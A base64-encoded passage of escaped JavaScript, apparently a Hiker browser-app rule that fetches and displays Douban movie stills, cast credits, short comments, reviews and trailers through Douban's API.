FxcclxcXFxuICAgICAgICAgICAgciArPSAnPGJyLz4nO1xcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG4gICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICB0aXRsZTogcixcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGkgPSBbXTtcXFxcclxcXFxuICAgIHMuY2VyZW1vbmllcy5mb3JFYWNoKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgIGkucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBlLnRpdGxlLFxcXFxyXFxcXG4gICAgICAgICAgICBkZXNjOiBlLnllYXIgKyAn5bm0JyxcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8zJyxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLnBpYy5ub3JtYWwgKyAnQFJlZmVyZXI9JyArIGUucGljLm5vcm1hbCxcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMnKS5ydWxlKChpZCwgbmFtZSkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgYXdhcmRWaWV3KGlkLCBuYW1lKTtcXFxcclxcXFxuICAgICAgICAgICAgfSwgZS5pZCwgZS50aXRsZSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxuICAgIGlmIChpLmxlbmd0aCA+IDApIHtcXFxcclxcXFxuICAgICAgICBpLnVuc2hpZnQoe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn5Y6G5bGK5Zue6aG+Jy5iaWcoKS5ib2xkKCksXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF8xJyxcXFxcclxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBzZXRSZXN1bHQoYS5jb25jYXQoaSkpO1xcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+WJp+eFp+mhtemdolxcXFxyXFxcXG5mdW5jdGlvbiBzdGlsbHNMaXN0KHR5cGUsIGlkKSB7XFxcXHJcXFxcbiAgICBhZGRMaXN0ZW5lcignb25DbG9zZScsICdjbGVhck15VmFyKFxcXFxcXFwicGhvdG9cXFxcXFxcIiknKTtcXFxcclxcXFxuICAgIGxldCBwYWdlID0gTVlfUEFHRTtcXFxcclxcXFxuICAgIGxldCBpdGVtcyA9IHtcXFxcclxcXFxuICAgICAgICDliafnhac6ICdwaG90b3MnLFxcXFxyXFxcXG4gICAgICAgIOa1t+aKpTogJ2NvdmVycydcXFxcclxcXFxuICAgIH07XFxcXHJcXFxcbiAgICBsZXQgYSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IHRlbXAgPSBnZXRNeVZhcigncGhvdG8nLCAncGhvdG9zJyk7XFxcXHJcXFxcbiAgICBsZXQgY29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxcXHJcXFxcbiAgICBmb3IgKGxldCBpIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAgPT0gaXRlbXNbaV0gPyAn4oCc4oCc4oCd4oCdJyArIGkuZm9udGNvbG9yKGNvbG9yKSA6IGksXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eScpLmxhenlSdWxlKCh0KSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcigncGhvdG8nLCB0KTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknO1xcXFxyXFxcXG4gICAgICAgICAgICB9LCBpdGVtc1tpXSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCByID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFxcXFxcIiArIHR5cGUgKyBcXFxcXFxcIi9cXFxcXFxcIiArIGlkICsgXFxcXFxcXCIvXFxcXFxcXCIgKyB0ZW1wICsgXFxcXFxcXCI/c3RhcnQ9XFxcXFxcXCIgKyAzMCAqIChwYWdlIC0gMSkgKyBcXFxcXFxcIiZjb3VudD0zMFxcXFxcXFwiKTtcXFxcclxcXFxuICAgIGxldCBsID0gci5waG90b3MubWFwKChlID0+ICh7XFxcXHJcXFxcbiAgICAgICAgdGl0bGU6IGUuY3JlYXRlX3RpbWUsXFxcXHJcXFxcbiAgICAgICAgaW1nOiBlLmltYWdlLnNtYWxsLnVybCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLmltYWdlLnNtYWxsLnVybCxcXFxcclxcXFxuICAgICAgICB1cmw6IGUuaW1hZ2UubGFyZ2UudXJsICsgXFxcXFxcXCI/dHlwZT0uanBnQFJlZmVyZXI9XFxcXFxcXCIgKyBlLmltYWdlLmxhcmdlLnVybCArIFxcXFxcXFwiP3R5cGU9LmpwZ1xcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInBpY18yXFxcXFxcXCJcXFxcclxcXFxuICAgIH0pKSk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgaWYgKHBhZ2UgPT0gMSkge1xcXFxyXFxcXG4gICAgICAgIGwudW5zaGlmdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9KTtcXFxcclxcXFxuICAgICAgICBpZiAodGVtcCA9PSAncGhvdG9zJykge1xcXFxyXFxcXG4gICAgICAgICAgICBsLnVuc2hpZnQoe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiPGJpZz7lhbE8c3Ryb25nPiBcXFxcXFxcIiArIHIudG90YWwgKyAnIDwvc3Ryb25nPuW8oOWJp+eFpzwvYmlnPjxici8+PHNtYWxsPjxmb250IGNvbG9yPVxcXFxcXFwiZ3JleVxcXFxcXFwiPuWumOaWueWJp+eFp++8micgKyByLm8gKyBcXFxcXFxcIuW8oCZuYnNwO+aIquWbvu+8mlxcXFxcXFwiICsgci5jICsgXFxcXFxcXCLlvKAmbmJzcDvlt6XkvZznhafvvJpcXFxcXFxcIiArIHIudyArIFxcXFxcXFwi5bygJm5ic3A75paw6Ze75Zu+54mH77yaXFxcXFxcXCIgKyByLm4gKyBcXFxcXFxcIuW8oCZuYnNwO+eyieS4neWbvueJh++8mlxcXFxcXFwiICsgci5mICsgXFxcXFxcXCLlvKA8L2ZvbnQ+PC9zbWFsbD5cXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcclxcXFxuICAgICAgICAgICAgbC51bnNoaWZ0KHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIjxiaWc+5YWxPHN0cm9uZz4gXFxcXFxcXCIgKyByLnRvdGFsICsgXFxcXFxcXCI8L3N0cm9uZz7lvKDmtbfmiqU8L2JpZz5cXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIGwgPSBhLmNvbmNhdChsKTtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIHNldEhvbWVSZXN1bHQoe1xcXFxyXFxcXG4gICAgICAgIGRhdGE6IGxcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v5ryU6IGM5Lq65ZGY6aG16Z2iXFxcXHJcXFxcbmZ1bmN0aW9uIGNyZWRpdHModHlwZSwgaWQpIHtcXFxcclxcXFxuICAgIGxldCBpID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFxcXFxcIiArIHR5cGUgKyBcXFxcXFxcIi9cXFxcXFxcIiArIGlkICsgXFxcXFxcXCIvY3JlZGl0c1xcXFxcXFwiKTtcXFxcclxcXFxuICAgIGxldCByID0gW107XFxcXHJcXFxcbiAgICBpLmNyZWRpdHMuZm9yRWFjaCgoZSA9PiB7XFxcXHJcXFxcbiAgICAgICAgci5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IGUudGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSk7XFxcXHJcXFxcbiAgICAgICAgZS5jZWxlYnJpdGllcy5mb3JFYWNoKChlID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgci5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBlLm5hbWUgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiICsgZS5sYXRpbl9uYW1lLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogZS5jaGFyYWN0ZXIsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGUuYXZhdGFyLm5vcm1hbCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBlLmF2YXRhci5ub3JtYWwsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfdmVydGljYWxfcGljJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lIycpLnJ1bGUoKGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZWxlc3NhclZpZXcoZS51cmkuc3BsaXQoXFxcXFxcXCJzdWJqZWN0X2lkPVxcXFxcXFwiKVsxXSwgZS5pZCwgZS5uYW1lKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0sIGUpXFxcXHJcXFxcbiAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgfSkpXFxcXHJcXFxcbiAgICB9KSk7XFxcXHJcXFxcbiAgICBzZXRIb21lUmVzdWx0KHtcXFxcclxcXFxuICAgICAgICBkYXRhOiByXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+efreivhOmhtemdolxcXFxyXFxcXG5mdW5jdGlvbiBzaG9ydENvbW1lbnRMaXN0KHR5cGUsIGlkKSB7XFxcXHJcXFxcbiAgICBhZGRMaXN0ZW5lcignb25DbG9zZScsIFxcXFxcXFwiY2xlYXJNeVZhcignc2hvcnRjb21tZW50JylcXFxcXFxcIik7XFxcXHJcXFxcbiAgICBsZXQgaXRlbXMgPSB7XFxcXHJcXFxcbiAgICAgICAg54Ot6ZeoOiAnaG90JyxcXFxcclxcXFxuICAgICAgICDmnIDmlrA6ICdsYXRlc3QnXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBsZXQgdSA9IGdldE15VmFyKCdzaG9ydGNvbW1lbnQnLCAnaG90Jyk7XFxcXHJcXFxcbiAgICBsZXQgYSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IGNob29zZUNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpIC8vIHx8IFxcXFxcXFwiI0ZBNzI5OFxcXFxcXFwiO1xcXFxyXFxcXG4gICAgZm9yIChpIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHUgPT09IGl0ZW1zW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY2hvb3NlQ29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5JykubGF6eVJ1bGUoKHQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwic2hvcnRjb21tZW50XFxcXFxcXCIsIHQpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcclxcXFxuICAgICAgICAgICAgfSwgaXRlbXNbaV0pXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgcGFnZSA9IE1ZX1BBR0U7XFxcXHJcXFxcbiAgICBsZXQgciA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0eXBlICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpZCArIFxcXFxcXFwiL2ludGVyZXN0cz9zdGFydD1cXFxcXFxcIiArIDMwICogKHBhZ2UgLSAxKSArIFxcXFxcXFwiJmNvdW50PTMwJm9yZGVyX2J5PVxcXFxcXFwiICsgdSk7XFxcXHJcXFxcbiAgICBsZXQgbCA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IHN0YXJDb2xvciA9IGdldENvbmZpZygnc3RhckNvbG9yJyk7XFxcXHJcXFxcbiAgICByLmludGVyZXN0cy5mb3JFYWNoKChlID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgdCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgaWYgKGUucmF0aW5nKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIHQgPSBjb21wdXRlUmF0aW5nKGUucmF0aW5nLm1heCwgZS5yYXRpbmcudmFsdWUpO1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgICAgICBsLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogZS51c2VyLm5hbWUsXFxcXHJcXFxcbiAgICAgICAgICAgIGltZzogZS51c2VyLmF2YXRhcixcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiBlLnVzZXIudXJsLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJhdmF0YXJcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pO1xcXFxyXFxcXG4gICAgICAgIGwucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBlLmNvbW1lbnQgKyAodCA/ICc8YnIvPjxzbWFsbD7nnIvov4cgPGZvbnQgY29sb3I9JyArIHN0YXJDb2xvciArICc+JyArIHQgKyBcXFxcXFxcIjwvZm9udD48L3NtYWxsPlxcXFxcXFwiIDogXFxcXFxcXCJcXFxcXFxcIikgKyAnPGJyLz48c21hbGw+PGZvbnQgY29sb3I9XFxcXFxcXCJncmV5XFxcXFxcXCI+JyArIGUudm90ZV9jb3VudCArIFxcXFxcXFwi6LWe4oCiXFxcXFxcXCIgKyAvXFxcXFxcXFxkezR9LVxcXFxcXFxcZHsxLDJ9LVxcXFxcXFxcZHsxLDJ9L2cuZXhlYyhlLmNyZWF0ZV90aW1lKSArIFxcXFxcXFwiPC9mb250Pjwvc21hbGw+XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSk7XFxcXHJcXFxcbiAgICAgICAgbC5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0pKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpZiAocGFnZSA9PSAxKSB7XFxcXHJcXFxcbiAgICAgICAgbC51bnNoaWZ0KHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pO1xcXFxyXFxcXG4gICAgICAgIGwudW5zaGlmdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIjxiaWc+5YWxPHN0cm9uZz4gXFxcXFxcXCIgKyByLnRvdGFsICsgXFxcXFxcXCIgPC9zdHJvbmc+5p2h55+t6K+EPC9iaWc+XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSk7XFxcXHJcXFxcbiAgICAgICAgc2V0SG9tZVJlc3VsdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGRhdGE6IGEuY29uY2F0KGwpXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgc2V0SG9tZVJlc3VsdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGRhdGE6IGxcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+WJp+ivhOmhtemdolxcXFxyXFxcXG5mdW5jdGlvbiBkcmFtYVJldmlld0xpc3QodHlwZSwgaWQpIHtcXFxcclxcXFxuICAgIGFkZExpc3RlbmVyKCdvbkNsb3NlJywgXFxcXFxcXCJjbGVhck15VmFyKCdkcmFtYXJldmlldycpXFxcXFxcXCIpO1xcXFxyXFxcXG4gICAgbGV0IGl0ZW1zID0ge1xcXFxyXFxcXG4gICAgICAgIOeDremXqDogJ2hvdCcsXFxcXHJcXFxcbiAgICAgICAg5pyA5pawOiAnbGF0ZXN0J1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgbGV0IHUgPSBnZXRNeVZhcignZHJhbWFyZXZpZXcnLCAnaG90Jyk7XFxcXHJcXFxcbiAgICBsZXQgYSA9IFtdO1xcXFxyXFxcXG4gICAgbGV0IGNob29zZUNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcXFxyXFxcXG4gICAgZm9yIChpIGluIGl0ZW1zKSB7XFxcXHJcXFxcbiAgICAgICAgYS5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IHUgPT09IGl0ZW1zW2ldID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY2hvb3NlQ29sb3IgKyAnPicgKyBpICsgJyA8L2ZvbnQ+PC9iPicgOiBpLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5JykubGF6eVJ1bGUoKHQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiZHJhbWFyZXZpZXdcXFxcXFxcIiwgdCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxyXFxcXG4gICAgICAgICAgICB9LCBpdGVtc1tpXSlcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCBwYWdlID0gTVlfUEFHRVxcXFxyXFxcXG4gICAgbGV0IHIgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXFxcXFwiICsgdHlwZSArIFxcXFxcXFwiL1xcXFxcXFwiICsgaWQgKyBcXFxcXFxcIi9yZXZpZXdzP3N0YXJ0PVxcXFxcXFwiICsgMTUgKiAocGFnZSAtIDEpICsgXFxcXFxcXCImY291bnQ9MTUmb3JkZXJfYnk9XFxcXFxcXCIgKyB1KTtcXFxcclxcXFxuICAgIGxldCBsID0gW107XFxcXHJcXFxcbiAgICBsZXQgc3RhckNvbG9yID0gZ2V0Q29uZmlnKCdzdGFyQ29sb3InKTtcXFxcclxcXFxuICAgIHIucmV2aWV3cy5mb3JFYWNoKChlID0+IHtcXFxcclxcXFxuICAgICAgICBsZXQgdCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgaWYgKGUucmF0aW5nKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIHQgPSBjb21wdXRlUmF0aW5nKGUucmF0aW5nLm1heCwgZS5yYXRpbmcudmFsdWUpO1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgICAgICBsZXQgaSA9IGUuY29tbWVudHNfY291bnQgPyBlLmNvbW1lbnRzX2NvdW50ICsgXFxcXFxcXCLlm57lpI1cXFxcXFxcIiA6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIHIgPSBlLnVzZWZ1bF9jb3VudCA/IGUudXNlZnVsX2NvdW50ICsgXFxcXFxcXCLmnInnlKhcXFxcXFxcIiA6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIG8gPSBlLnJlc2hhcmVzX2NvdW50ID8gZS5yZXNoYXJlc19jb3VudCArIFxcXFxcXFwi6L2s5Y+RXFxcXFxcXCIgOiBcXFxcXFxcIlxcXFxcXFwiO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgICAgICByID0gaSAmJiByID8gXFxcXFxcXCLigKJcXFxcXFxcIiArIHIgOiByO1xcXFxyXFxcXG4gICAgICAgIG8gPSAoaSB8fCByKSAmJiBvID8gXFxcXFxcXCLigKJcXFxcXFxcIiArIG8gOiBvO1xcXFxyXFxcXG4gICAgICAgIGwucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBlLnVzZXIubmFtZSxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLnVzZXIuYXZhdGFyLFxcXFxyXFxcXG4gICAgICAgICAgICB1cmw6IGUudXNlci51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImF2YXRhclxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICBsLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCI8c3Ryb25nPlxcXFxcXFwiICsgZS50aXRsZSArIFxcXFxcXFwiPC9zdHJvbmc+PGJyLz5cXFxcXFxcIiArIGUuYWJzdHJhY3QgKyAnICAgPHNtYWxsPig8YSBocmVmPVxcXFxcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjQHJ1bGU9anM6ZXZhbChKU09OLnBhcnNlKGZldGNoKGBoaWtlcjovL3BhZ2UvbWFpbmApKS5ydWxlKTtkcmFtYVJldmlld1ZpZXcoJyArIGUuaWQgKyAnKVxcXFxcXFwiPuabtOWkmjwvYT4pPC9zbWFsbD4nICsgKHQgPyAnPGJyLz48c21hbGw+55yL6L+HIDxmb250IGNvbG9yPScgKyBzdGFyQ29sb3IgKyAnPicgKyB0ICsgXFxcXFxcXCI8L2ZvbnQ+PC9zbWFsbD5cXFxcXFxcIiA6IFxcXFxcXFwiXFxcXFxcXCIpICsgJzxici8+PHNtYWxsPjxmb250IGNvbG9yPVxcXFxcXFwiZ3JleVxcXFxcXFwiPicgKyBpICsgciArIG8gKyBcXFxcXFxcIjwvZm9udD48L3NtYWxsPlxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgbC5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH0pKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpZiAocGFnZSA9PSAxKSB7XFxcXHJcXFxcbiAgICAgICAgbC51bnNoaWZ0KHtcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pO1xcXFxyXFxcXG4gICAgICAgIGwudW5zaGlmdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIjxiaWc+5YWxPHN0cm9uZz4gXFxcXFxcXCIgKyByLnRvdGFsICsgXFxcXFxcXCIgPC9zdHJvbmc+5p2h5Ymn6K+EPC9iaWc+XFxcXFxcXCIsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgICAgIHNldEhvbWVSZXN1bHQoe1xcXFxyXFxcXG4gICAgICAgICAgICBkYXRhOiBhLmNvbmNhdChsKVxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgIHNldEhvbWVSZXN1bHQoe1xcXFxyXFxcXG4gICAgICAgICAgICBkYXRhOiBsXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/pooTlkYrniYfpobXpnaJcXFxcclxcXFxuZnVuY3Rpb24gdHJhaWxlcnModHlwZSwgaWQpIHtcXFxcclxcXFxuICAgIHNldFBhZ2VUaXRsZSgn6aKE5ZGKLeeJh+autS3oirHnta4nKVxcXFxyXFxcXG4gICAgbGV0IGkgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXFxcXFwiICsgdHlwZSArIFxcXFxcXFwiL1xcXFxcXFwiICsgaWQgKyBcXFxcXFxcIi90cmFpbGVyc1xcXFxcXFwiKS50cmFpbGVycztcXFxcclxcXFxuICAgIGkuZm9yRWFjaCgoZSA9PiB7XFxcXHJcXFxcbiAgICAgICAgZS5jb2xfdHlwZSA9IFxcXFxcXFwibW92aWVfMlxcXFxcXFwiLCBlLmRlc2MgPSBlLnN1YmplY3RfdGl0bGUgKyBcXFxcXFxcIuKAolxcXFxcXFwiICsgZS5jcmVhdGVfdGltZSwgZS5pbWcgPSBlLmNvdmVyX3VybCwgZS51cmwgPSBlLnZpZGVvX3VybFxcXFxyXFxcXG4gICAgfSkpO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCByID0gaS5maWx0ZXIoKGUgPT4gXFxcXFxcXCJBXFxcXFxcXCIgPT09IGUudHlwZSkpO1xcXFxyXFxcXG4gICAgbGV0IGwgPSBpLmZpbHRlcigoZSA9PiBcXFxcXFxcIkJcXFxcXFxcIiA9PT0gZS50eXBlKSk7XFxcXHJcXFxcbiAgICBsZXQgbyA9IGkuZmlsdGVyKChlID0+IFxcXFxcXFwiQ1xcXFxcXFwiID09PSBlLnR5cGUpKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpZiAoci5sZW5ndGggPiAwKSB7XFxcXHJcXFxcbiAgICAgICAgci51bnNoaWZ0KHtcXFxcclxcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6aKE5ZGKXFxcXFxcXCIsXFxcXHJcXFxcbiAgIC